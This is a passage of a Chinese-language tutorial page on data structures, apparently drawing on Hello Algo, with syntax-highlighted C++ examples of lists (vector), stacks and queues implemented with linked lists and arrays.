src="https://www.hello-algo.com/chapter_array_and_linkedlist/linked_list.assets/linkedlist_common_types.png" srcset="/img/loading.gif" lazyload></p><p>单向链表通常用于实现栈、队列、哈希表和图等数据结构。</p><ul><li><strong>栈与队列</strong>：当插入和删除操作都在链表的一端进行时，它表现的特性为先进后出，对应栈；当插入操作在链表的一端进行，删除操作在链表的另一端进行，它表现的特性为先进先出，对应队列。</li><li><strong>哈希表</strong>：链式地址是解决哈希冲突的主流方案之一，在该方案中，所有冲突的元素都会被放到一个链表中。</li><li><strong>图</strong>：邻接表是表示图的一种常用方式，其中图的每个顶点都与一个链表相关联，链表中的每个元素都代表与该顶点相连的其他顶点。</li></ul><p>双向链表常用于需要快速查找前一个和后一个元素的场景。</p><ul><li><strong>高级数据结构</strong>：比如在红黑树、B 树中，我们需要访问节点的父节点，这可以通过在节点中保存一个指向父节点的引用来实现，类似于双向链表。</li><li><strong>浏览器历史</strong>：在网页浏览器中，当用户点击前进或后退按钮时，浏览器需要知道用户访问过的前一个和后一个网页。双向链表的特性使得这种操作变得简单。</li><li><strong>LRU 算法</strong>：在缓存淘汰（LRU）算法中，我们需要快速找到最近最少使用的数据，以及支持快速添加和删除节点。这时候使用双向链表就非常合适。</li></ul><p>环形链表常用于需要周期性操作的场景，比如操作系统的资源调度。</p><ul><li><strong>时间片轮转调度算法</strong>：在操作系统中，时间片轮转调度算法是一种常见的 CPU 调度算法，它需要对一组进程进行循环。每个进程被赋予一个时间片，当时间片用完时，CPU 将切换到下一个进程。这种循环操作可以通过环形链表来实现。</li><li><strong>数据缓冲区</strong>：在某些数据缓冲区的实现中，也可能会使用环形链表。比如在音频、视频播放器中，数据流可能会被分成多个缓冲块并放入一个环形链表，以便实现无缝播放。</li></ul><h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><p>列表（list）是一个抽象的数据结构概念，它表示元素的有序集合，支持元素访问、修改、添加、删除和遍历等操作，无须使用者考虑容量限制的问题。列表可以基于链表或数组实现。</p><ul><li>链表天然可以看作一个列表，其支持元素增删查改操作，并且可以灵活动态扩容。</li><li>数组也支持元素增删查改，但由于其长度不可变，因此只能看作一个具有长度限制的列表。</li></ul><p>当使用数组实现列表时，<strong>长度不可变的性质会导致列表的实用性降低</strong>。这是因为我们通常无法事先确定需要存储多少数据，从而难以选择合适的列表长度。若长度过小，则很可能无法满足使用需求；若长度过大，则会造成内存空间浪费。</p><p>为解决此问题，我们可以使用动态数组（dynamic array）来实现列表。它继承了数组的各项优点，并且可以在程序运行过程中进行动态扩容。</p><p>实际上，<strong>许多编程语言中的标准库提供的列表是基于动态数组实现的</strong>，例如 Python 中的 <code>list</code> 、Java 中的 <code>ArrayList</code> 、C++ 中的 <code>vector</code> 和 C# 中的 <code>List</code> 等。在接下来的讨论中，我们将把“列表”和“动态数组”视为等同的概念。</p><h5 id="1-初始化列表"><a href="#1-初始化列表" class="headerlink" title="1. 初始化列表"></a>1. 初始化列表</h5><p>我们通常使用“无初始值”和“有初始值”这两种初始化方法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 初始化列表 */</span><br><span class="hljs-comment">// 需注意，C++ 中 vector 即是本文描述的 nums</span><br><span class="hljs-comment">// 无初始值</span><br>vector&lt;<span class="hljs-type">int</span>&gt; nums1;<br><span class="hljs-comment">// 有初始值</span><br>vector&lt;<span class="hljs-type">int</span>&gt; nums = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span> &#125;;<br></code></pre></td></tr></table></figure><h5 id="2-访问元素"><a href="#2-访问元素" class="headerlink" title="2. 访问元素"></a>2. 访问元素</h5><p>列表本质上是数组，因此可以在$O(1)$时间内访问和更新元素，效率很高。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 访问元素 */</span><br><span class="hljs-type">int</span> num = nums[<span class="hljs-number">1</span>];  <span class="hljs-comment">// 访问索引 1 处的元素</span><br><br><span class="hljs-comment">/* 更新元素 */</span><br>nums[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 将索引 1 处的元素更新为 0</span><br></code></pre></td></tr></table></figure><h5 id="3-插入与删除元素"><a href="#3-插入与删除元素" class="headerlink" title="3. 插入与删除元素"></a>3. 插入与删除元素</h5><p>相较于数组，列表可以自由地添加与删除元素。在列表尾部添加元素的时间复杂度为$O(1)$，但插入和删除元素的效率仍与数组相同，时间复杂度为$O(n)$。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 清空列表 */</span><br>nums.<span class="hljs-built_in">clear</span>();<br><br><span class="hljs-comment">/* 在尾部添加元素 */</span><br>nums.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">1</span>);<br>nums.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">3</span>);<br>nums.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">2</span>);<br>nums.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">5</span>);<br>nums.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">4</span>);<br><br><span class="hljs-comment">/* 在中间插入元素 */</span><br>nums.<span class="hljs-built_in">insert</span>(nums.<span class="hljs-built_in">begin</span>() + <span class="hljs-number">3</span>, <span class="hljs-number">6</span>);  <span class="hljs-comment">// 在索引 3 处插入数字 6</span><br><br><span class="hljs-comment">/* 删除元素 */</span><br>nums.<span class="hljs-built_in">erase</span>(nums.<span class="hljs-built_in">begin</span>() + <span class="hljs-number">3</span>);      <span class="hljs-comment">// 删除索引 3 处的元素</span><br></code></pre></td></tr></table></figure><h5 id="4-遍历列表"><a href="#4-遍历列表" class="headerlink" title="4. 遍历列表"></a>4. 遍历列表</h5><p>与数组一样，列表可以根据索引遍历，也可以直接遍历各元素。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 通过索引遍历列表 */</span><br><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;<br>    count += nums[i];<br>&#125;<br><br><span class="hljs-comment">/* 直接遍历列表元素 */</span><br>count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>    count += num;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="5-拼接列表"><a href="#5-拼接列表" class="headerlink" title="5. 拼接列表"></a>5. 拼接列表</h5><p>给定一个新列表 <code>nums1</code> ，我们可以将其拼接到原列表的尾部。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 拼接两个列表 */</span><br>vector&lt;<span class="hljs-type">int</span>&gt; nums1 = &#123; <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">10</span>, <span class="hljs-number">9</span> &#125;;<br><span class="hljs-comment">// 将列表 nums1 拼接到 nums 之后</span><br>nums.<span class="hljs-built_in">insert</span>(nums.<span class="hljs-built_in">end</span>(), nums<span class="hljs-number">1.</span><span class="hljs-built_in">begin</span>(), nums<span class="hljs-number">1.</span><span class="hljs-built_in">end</span>());<br></code></pre></td></tr></table></figure><h5 id="6-排序列表"><a href="#6-排序列表" class="headerlink" title="6.  排序列表"></a>6.  排序列表</h5><p>完成列表排序后，我们便可以使用在数组类算法题中经常考查的“二分查找”和“双指针”算法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 排序列表 */</span><br><span class="hljs-built_in">sort</span>(nums.<span class="hljs-built_in">begin</span>(), nums.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// 排序后，列表元素从小到大排列</span><br></code></pre></td></tr></table></figure><h3 id="第5章-栈与队列"><a href="#第5章-栈与队列" class="headerlink" title="第5章 栈与队列"></a>第5章 栈与队列</h3><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><h5 id="栈的常用操作"><a href="#栈的常用操作" class="headerlink" title="栈的常用操作"></a>栈的常用操作</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 初始化栈 */</span><br>stack&lt;<span class="hljs-type">int</span>&gt; stack;<br><br><span class="hljs-comment">/* 元素入栈 */</span><br>stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);<br>stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">2</span>);<br>stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);<br>stack.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);<br><br><span class="hljs-comment">/* 访问栈顶元素 */</span><br><span class="hljs-type">int</span> top = stack.<span class="hljs-built_in">top</span>();<br><br><span class="hljs-comment">/* 元素出栈 */</span><br>stack.<span class="hljs-built_in">pop</span>(); <span class="hljs-comment">// 无返回值</span><br><br><span class="hljs-comment">/* 获取栈的长度 */</span><br><span class="hljs-type">int</span> size = stack.<span class="hljs-built_in">size</span>();<br><br><span class="hljs-comment">/* 判断是否为空 */</span><br><span class="hljs-type">bool</span> empty = stack.<span class="hljs-built_in">empty</span>();<br></code></pre></td></tr></table></figure><h5 id="栈的实现"><a href="#栈的实现" class="headerlink" title="栈的实现"></a>栈的实现</h5><p>为了深入了解栈的运行机制，我们来尝试自己实现一个栈类。</p><p>栈遵循先入后出的原则，因此我们只能在栈顶添加或删除元素。然而，数组和链表都可以在任意位置添加和删除元素，<strong>因此栈可以视为一种受限制的数组或链表</strong>。换句话说，我们可以“屏蔽”数组或链表的部分无关操作，使其对外表现的逻辑符合栈的特性。</p><ol><li>基于链表的实现：</li></ol><p>使用链表实现栈时，我们可以将链表的头节点视为栈顶，尾节点视为栈底。</p><p>如图所示，对于入栈操作，我们只需将元素插入链表头部，这种节点插入方法被称为“头插法”。而对于出栈操作，只需将头节点从链表中删除即可。</p><p><img src="https://www.hello-algo.com/chapter_stack_and_queue/stack.assets/linkedlist_stack_step1.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://www.hello-algo.com/chapter_stack_and_queue/stack.assets/linkedlist_stack_step2_push.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://www.hello-algo.com/chapter_stack_and_queue/stack.assets/linkedlist_stack_step3_pop.png" srcset="/img/loading.gif" lazyload></p><p>以下是基于链表实现栈的示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 基于链表实现的栈 */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LinkedListStack</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    ListNode *stackTop; <span class="hljs-comment">// 将头节点作为栈顶</span><br>    <span class="hljs-type">int</span> stkSize;        <span class="hljs-comment">// 栈的长度</span><br><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">LinkedListStack</span>() &#123;<br>        stackTop = <span class="hljs-literal">nullptr</span>;<br>        stkSize = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    ~<span class="hljs-built_in">LinkedListStack</span>() &#123;<br>        <span class="hljs-comment">// 遍历链表删除节点，释放内存</span><br>        <span class="hljs-built_in">freeMemoryLinkedList</span>(stackTop);<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取栈的长度 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> stkSize;<br>    &#125;<br><br>    <span class="hljs-comment">/* 判断栈是否为空 */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isEmpty</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 入栈 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        ListNode *node = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(num);<br>        node-&gt;next = stackTop;<br>        stackTop = node;<br>        stkSize++;<br>    &#125;<br><br>    <span class="hljs-comment">/* 出栈 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-type">int</span> num = <span class="hljs-built_in">top</span>();<br>        ListNode *tmp = stackTop;<br>        stackTop = stackTop-&gt;next;<br>        <span class="hljs-comment">// 释放内存</span><br>        <span class="hljs-keyword">delete</span> tmp;<br>        stkSize--;<br>        <span class="hljs-keyword">return</span> num;<br>    &#125;<br><br>    <span class="hljs-comment">/* 访问栈顶元素 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">top</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isEmpty</span>())<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">&quot;栈为空&quot;</span>);<br>        <span class="hljs-keyword">return</span> stackTop-&gt;val;<br>    &#125;<br><br>    <span class="hljs-comment">/* 将 List 转化为 Array 并返回 */</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">toVector</span><span class="hljs-params">()</span> </span>&#123;<br>        ListNode *node = stackTop;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">res</span><span class="hljs-params">(size())</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = res.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>            res[i] = node-&gt;val;<br>            node = node-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><ol start="2"><li>基于数组的实现：</li></ol><p>使用数组实现栈时，我们可以将数组的尾部作为栈顶。入栈与出栈操作分别对应在数组尾部添加元素与删除元素。由于入栈的元素可能会源源不断地增加，因此我们可以使用动态数组，这样就无须自行处理数组扩容问题。以下为示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 基于数组实现的栈 */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayStack</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    vector&lt;<span class="hljs-type">int</span>&gt; stack;<br><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/* 获取栈的长度 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> stack.<span class="hljs-built_in">size</span>();<br>    &#125;<br><br>    <span class="hljs-comment">/* 判断栈是否为空 */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isEmpty</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> stack.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 入栈 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        stack.<span class="hljs-built_in">push_back</span>(num);<br>    &#125;<br><br>    <span class="hljs-comment">/* 出栈 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-type">int</span> num = <span class="hljs-built_in">top</span>();<br>        stack.<span class="hljs-built_in">pop_back</span>();<br>        <span class="hljs-keyword">return</span> num;<br>    &#125;<br><br>    <span class="hljs-comment">/* 访问栈顶元素 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">top</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isEmpty</span>())<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">&quot;栈为空&quot;</span>);<br>        <span class="hljs-keyword">return</span> stack.<span class="hljs-built_in">back</span>();<br>    &#125;<br><br>    <span class="hljs-comment">/* 返回 Vector */</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">toVector</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> stack;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="时间效率"><a href="#时间效率" class="headerlink" title="时间效率"></a>时间效率</h5><p>在基于数组的实现中，入栈和出栈操作都在预先分配好的连续内存中进行，具有很好的缓存本地性，因此效率较高。然而，如果入栈时超出数组容量，会触发扩容机制，导致该次入栈操作的时间复杂度变为$O(n)$。</p><p>在基于链表的实现中，链表的扩容非常灵活，不存在上述数组扩容时效率降低的问题。但是，入栈操作需要初始化节点对象并修改指针，因此效率相对较低。不过，如果入栈元素本身就是节点对象，那么可以省去初始化步骤，从而提高效率。</p><p>综上所述，当入栈与出栈操作的元素是基本数据类型时，例如 <code>int</code> 或 <code>double</code> ，我们可以得出以下结论。</p><ul><li>基于数组实现的栈在触发扩容时效率会降低，但由于扩容是低频操作，因此平均效率更高。</li><li>基于链表实现的栈可以提供更加稳定的效率表现。</li></ul><h4 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h4><h5 id="队列的常用操作"><a href="#队列的常用操作" class="headerlink" title="队列的常用操作"></a>队列的常用操作</h5><p>我们可以直接使用编程语言中现成的队列类：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 初始化队列 */</span><br>queue&lt;<span class="hljs-type">int</span>&gt; queue;<br><br><span class="hljs-comment">/* 元素入队 */</span><br>queue.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>queue.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);<br>queue.<span class="hljs-built_in">push</span>(<span class="hljs-number">2</span>);<br>queue.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);<br>queue.<span class="hljs-built_in">push</span>(<span class="hljs-number">4</span>);<br><br><span class="hljs-comment">/* 访问队首元素 */</span><br><span class="hljs-type">int</span> front = queue.<span class="hljs-built_in">front</span>();<br><br><span class="hljs-comment">/* 元素出队 */</span><br>queue.<span class="hljs-built_in">pop</span>();<br><br><span class="hljs-comment">/* 获取队列的长度 */</span><br><span class="hljs-type">int</span> size = queue.<span class="hljs-built_in">size</span>();<br><br><span class="hljs-comment">/* 判断队列是否为空 */</span><br><span class="hljs-type">bool</span> empty = queue.<span class="hljs-built_in">empty</span>();<br></code></pre></td></tr></table></figure><h5 id="队列实现"><a href="#队列实现" class="headerlink" title="队列实现"></a>队列实现</h5><p>为了实现队列，我们需要一种数据结构，可以在一端添加元素，并在另一端删除元素，链表和数组都符合要求。</p><ol><li>基于链表的实现：</li></ol><p>我们可以将链表的“头节点”和“尾节点”分别视为“队首”和“队尾”，规定队尾仅可添加节点，队首仅可删除节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 基于链表实现的队列 */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LinkedListQueue</span> &#123;<br>  <span class="hljs-keyword">private</span>:<br>    ListNode *front, *rear; <span class="hljs-comment">// 头节点 front ，尾节点 rear</span><br>    <span class="hljs-type">int</span> queSize;<br><br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">LinkedListQueue</span>() &#123;<br>        front = <span class="hljs-literal">nullptr</span>;<br>        rear = <span class="hljs-literal">nullptr</span>;<br>        queSize = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    ~<span class="hljs-built_in">LinkedListQueue</span>() &#123;<br>        <span class="hljs-comment">// 遍历链表删除节点，释放内存</span><br>        <span class="hljs-built_in">freeMemoryLinkedList</span>(front);<br>    &#125;<br><br>    <span class="hljs-comment">/* 获取队列的长度 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> queSize;<br>    &#125;<br><br>    <span class="hljs-comment">/* 判断队列是否为空 */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isEmpty</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> queSize == <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* 入队 */</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-comment">// 在尾节点后添加 num</span><br>        ListNode *node = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(num);<br>        <span class="hljs-comment">// 如果队列为空，则令头、尾节点都指向该节点</span><br>        <span class="hljs-keyword">if</span> (front == <span class="hljs-literal">nullptr</span>) &#123;<br>            front = node;<br>            rear = node;<br>        &#125;<br>        <span class="hljs-comment">// 如果队列不为空，则将该节点添加到尾节点后</span><br>        <span class="hljs-keyword">else</span> &#123;<br>            rear-&gt;next = node;<br>            rear = node;<br>        &#125;<br>        queSize++;<br>    &#125;<br><br>    <span class="hljs-comment">/* 出队 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-type">int</span> num = <span class="hljs-built_in">peek</span>();<br>        <span class="hljs-comment">// 删除头节点</span><br>        ListNode *tmp = front;<br>        front = front-&gt;next;<br>        <span class="hljs-comment">// 释放内存</span><br>        <span class="hljs-keyword">delete</span> tmp;<br>        queSize--;<br>        <span class="hljs-keyword">return</span> num;<br>    &#125;<br><br>    <span class="hljs-comment">/* 访问队首元素 */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">peek</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-built_in">out_of_range</span>(<span class="hljs-string">&quot;队列为空&quot;</span>);<br>        <span class="hljs-keyword">return</span> front-&gt;val;<br>    &#125;<br><br>    <span class="hljs-comment">/* 将链表转化为 Vector 并返回 */</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">toVector</span><span class="hljs-params">()</span> </span>&#123;<br>        ListNode *node = front;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">res</span><span class="hljs-params">(size())</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; res.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            res[i] = node-&gt;val;<br>            node = node-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><ol 